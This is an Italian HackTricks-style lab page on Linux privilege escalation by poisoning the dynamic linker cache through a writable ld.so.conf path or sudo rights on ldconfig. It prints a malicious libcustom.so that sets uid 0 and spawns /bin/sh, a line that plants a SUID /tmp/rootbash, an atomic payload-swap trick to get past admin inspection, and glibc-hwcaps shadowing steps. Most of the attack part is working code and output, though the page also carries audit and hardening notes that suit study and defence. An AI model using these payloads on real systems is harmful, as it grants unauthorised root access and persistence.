# esempio di exploit privesc di ld.so

{{#include ../../banners/hacktricks-training.md}}

Questa pagina è un laboratorio incentrato sull'avvelenamento della **cache del linker di sistema tramite `/etc/ld.so.conf` o `ldconfig`**. Per l'injection di librerie mancanti, `RPATH`/`RUNPATH` scrivibili, `LD_PRELOAD` e altri abusi generici del linker SUID, consulta [Abuso di librerie condivise e linker SUID](suid-shared-library-and-linker-abuse.md).

## Preparazione dell'ambiente

Nella sezione seguente puoi trovare il codice dei file che utilizzeremo per preparare l'ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** quei file sul tuo computer nella stessa cartella
2. **Compila** la **libreria**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` in `/usr/lib` e aggiorna la cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilegi di root)
4. **Compila** l'**eseguibile**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Controlla l'ambiente

Verifica che _libcustom.so_ venga **caricata** da _/usr/lib_ e che tu possa **eseguire** il binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandi utili per il triage

Quando attacchi un target reale, verifica il **nome esatto della libreria** richiesta dal binario, cosa sta **risolvendo attualmente il loader** e quali percorsi configurati sono scrivibili senza modificare la cache attiva.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Usa `ldd` solo su un eseguibile **attendibile**. Alcune implementazioni o interpreti ELF insoliti possono causare l'esecuzione di codice controllato dall'attaccante; `objdump -p ./file | grep NEEDED` elenca in modo sicuro le dipendenze dirette. Per un target attendibile, invocare l'interprete individuato con `--list` mostra la risoluzione effettiva. Confronta quell'output con `--inhibit-cache --list`: una differenza dimostra che è stato `/etc/ld.so.cache`, anziché una normale regola del percorso di ricerca, a selezionare l'oggetto.<sup>[[1]](#references)[[4]](#references)</sup>

Alcune insidie utili:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` di solito **non funziona** perché
la redirezione viene eseguita dalla shell corrente. Usa invece
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- I binari **SUID/privilegiati** vengono eseguiti in **secure-execution mode**: `LD_LIBRARY_PATH`
viene ignorato, mentre `LD_PRELOAD` è soggetto a restrizioni (i nomi contenenti slash
vengono ignorati e possono essere precaricate solo le librerie contrassegnate come setuid nelle
directory standard). Quando root esegue `ldconfig`, le directory elencate in
`/etc/ld.so.conf` possono entrare in `/etc/ld.so.cache`; pertanto questa configurazione errata può
comunque influire sui programmi privilegiati.<sup>[[1]](#references)[[2]](#references)</sup>
- Anche `LD_DEBUG` viene ignorato in secure-execution mode a meno che non esista `/etc/suid-debug`, quindi raccogli la sua traccia da un'esecuzione non-SUID equivalente invece di aspettarti un output dall'esecuzione privilegiata.<sup>[[1]](#references)</sup>
- In glibc 2.33 e versioni successive, il dynamic loader espone anche
`--list-diagnostics`, che stampa diagnostica del loader leggibile dalle macchine e informazioni sui percorsi di ricerca integrati quando un hijack non si comporta come previsto.<sup>[[1]](#references)[[6]](#references)</sup>

### Vincoli della cache e del SONAME

`ldconfig` non mette in cache ogni file arbitrario presente in una directory configurata: esamina gli header ELF, riconosce i nomi che corrispondono a `lib*.so*` o `ld-*.so*` e si aspetta la catena convenzionale `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. L'oggetto iniettato deve quindi avere l'architettura/classe del target, il nome esatto `DT_NEEDED` (normalmente il suo `DT_SONAME`) e tutti i simboli/le versioni risolti dalla vittima.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Preferisci una libreria specifica per il target, come in questo esempio. Sostituire uno SONAME comune con un oggetto incompleto può interrompere ogni processo che lo risolve prima dell'esecuzione del target privilegiato.<sup>[[3]](#references)</sup>

### Persistenza del percorso nella cache e sostituzioni atomiche

La cache registra una mappatura **nome della libreria al percorso**; non incorpora l'oggetto condiviso. Dopo che un percorso controllato dall'attaccante è stato memorizzato nella cache, sostituire l'oggetto esattamente in quel percorso influisce sui processi avviati successivamente senza un'altra esecuzione di `ldconfig`. Questo abilita un utile pattern time-of-check/time-of-use: esporre una libreria valida durante la ricostruzione o l'ispezione della cache da parte di un amministratore, quindi rinominare atomicamente il payload sovrascrivendo quello esistente. I processi già in esecuzione mantengono l'oggetto che hanno già mappato.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Allo stesso modo, eliminare la riga malevola da `ld.so.conf` non rimuove automaticamente una voce già scritta: l'amministratore deve rimuovere l'oggetto non attendibile, correggere la proprietà/l'accesso in scrittura e ricostruire la cache. Usa il confronto con `--inhibit-cache` riportato sopra per distinguere una voce obsoleta della cache da un percorso di configurazione ancora attivo.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

In questo scenario, supponiamo che un amministratore abbia aggiunto una voce vulnerabile a un
file sotto `/etc/ld.so.conf.d/` incluso dal file di sistema
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La cartella vulnerabile è _/home/ubuntu/lib_ (dove abbiamo accesso in scrittura).\
**Scarica e compila** il seguente codice all'interno di quel percorso:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Se prevedi che **root** (o un altro account privilegiato) esegua in seguito il binary vulnerabile, di solito è meglio lasciare un **artefatto di proprietà di root** invece di avviare una shell interattiva. Ad esempio:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Quindi, dopo l'esecuzione con privilegi, puoi usare `/tmp/rootbash -p`.

Ora che abbiamo **creato la libreria libcustom dannosa all'interno del percorso configurato erroneamente**, la cache predefinita deve essere ricostruita tramite un'esecuzione riuscita e privilegiata di **`ldconfig`**. Un riavvio è utile solo nei casi in cui il processo di avvio locale la invochi effettivamente; altrimenti attendi un'azione dell'amministratore o usa una regola sudo non sicura, se disponibile.<sup>[[2]](#references)</sup>

Dopo che ciò è avvenuto, **ricontrolla** da dove l'eseguibile `sharedvuln` sta caricando la libreria `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Come puoi vedere, lo sta **caricando da `/home/ubuntu/lib`** e, se un utente qualsiasi lo esegue, verrà avviata una shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Nota che in questo esempio non abbiamo effettuato un'escalation dei privilegi, ma modificando i comandi eseguiti e **attendendo che root o un altro utente privilegiato esegua il binary vulnerabile** saremo in grado di effettuare un'escalation dei privilegi.

### Modern `glibc-hwcaps` shadowing

A partire da glibc 2.33, il loader può preferire librerie ottimizzate all'interno di `glibc-hwcaps/<level>/` in **ogni directory di ricerca delle librerie**. Di conseguenza, controllare solo `/home/ubuntu/lib` non è sufficiente: una sottodirectory compatibile e scrivibile come `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` può fare shadowing della libreria di base dopo che `ldconfig` l'ha indicizzata, mentre altre CPU continuano a utilizzare l'oggetto di base. Questo fornisce anche un hijack selettivo per architettura che può non essere rilevato quando la validazione avviene su una CPU diversa.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Le attuali indicazioni di hardening di glibc raccomandano di evitare SONAME duplicati, percorsi di ricerca non predefiniti e oggetti nelle sottodirectory `glibc-hwcaps`. Dal punto di vista dell'audit, applica ricorsivamente i controlli di proprietà e scrittura alle directory configurate e ai componenti del loro percorso padre.<sup>[[3]](#references)</sup>

### Altre misconfigurazioni - Stessa vuln

Nell'esempio precedente abbiamo simulato una misconfigurazione in cui un amministratore **impostava una cartella non privilegiata all'interno di un file di configurazione dentro `/etc/ld.so.conf.d/`**.\
Tuttavia, esistono altre misconfigurazioni che possono causare la stessa vulnerabilità: se disponi di **permessi di scrittura** su un **file di configurazione** caricato, puoi creare un file in una directory `/etc/ld.so.conf.d/` scrivibile oppure puoi scrivere in `/etc/ld.so.conf`, puoi configurare e sfruttare la stessa vulnerabilità.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Supponiamo che tu disponga di privilegi sudo su `ldconfig`**. `ldconfig` accetta le directory da analizzare come argomenti posizionali, quindi la forma più breve di cache poisoning è spesso semplicemente:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
In alternativa, `-f` seleziona un altro file di configurazione mantenendo l'output della cache predefinita. Ciò è utile quando un filtro degli argomenti blocca le directory posizionali ma consente comunque `-f`, oppure quando devono essere iniettati diversi percorsi:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ora, come indicato nel **precedente exploit**, **crea la libreria malevola all'interno di `/tmp`**.\
Infine, carichiamo il path e verifichiamo da dove il binario sta caricando la libreria:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Come puoi vedere, avendo privilegi sudo su `ldconfig` puoi sfruttare la stessa vulnerabilità.** I dettagli delle opzioni sono importanti quando si valuta una regola sudo vincolata: `-f` seleziona un'altra configurazione, ma ricostruisce comunque `/etc/ld.so.cache`; `-C` reindirizza la cache altrove; `-N` impedisce la ricostruzione della cache; e `-X` impedisce gli aggiornamenti dei link, ma **ricostruisce comunque la cache se non viene usato insieme a `-N`**. `-n` implica `-N`, quindi può aggiornare i link nelle directory fornite, ma non può avvelenare la cache; `-r` opera al di sotto di una root alternativa e normalmente non modifica la cache dell'host.<sup>[[2]](#references)</sup>

## glibc 2.44: tunables a livello globale del sistema memorizzati nella cache

A partire da glibc 2.44, `ldconfig` analizza anche `/etc/tunables.conf` e memorizza le relative impostazioni come estensione in `/etc/ld.so.cache`. Il file accetta direttive `include` e filtri per processo. I prefissi controllano l'ambito: `@` si applica solo ai processi `AT_SECURE`, `$` li esclude e `*` si applica a entrambi. Questo amplia il perimetro dell'audit oltre le directory delle librerie: una configurazione tunables scrivibile o un file incluso può influenzare i successivi avvii dei programmi dopo una ricostruzione privilegiata della cache.<sup>[[7]](#references)</sup>

La stessa release aggiunge `ldconfig -t TUNCONF`, che seleziona un file tunables alternativo continuando però a scrivere nella cache normale, salvo che un'altra opzione ne modifichi la destinazione. Pertanto, wrapper e regole sudo che tentavano di bloccare solo `-f` devono rifiutare anche `-t`, directory posizionali arbitrarie e la manipolazione dell'output della cache.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Questo non comporta automaticamente l'esecuzione di codice arbitrario. È una primitiva privilegiata di **loader-behavior manipulation**: glibc avverte esplicitamente che i valori a livello di sistema possono applicare tunable sensibili alla sicurezza ai programmi setuid/setgid senza uno screening di sicurezza per ogni tunable. Enumera i tunable effettivi dell'host con `--list-tunables` e cerca modifiche all'allocator specifiche per il target, modifiche all'hardening della CPU o condizioni di denial-of-service, invece di presumere l'esistenza di un payload universale.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening del Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - pagina del manuale Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostica del Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables a livello di sistema (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Aggiunta di tunables a livello di sistema: parte ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
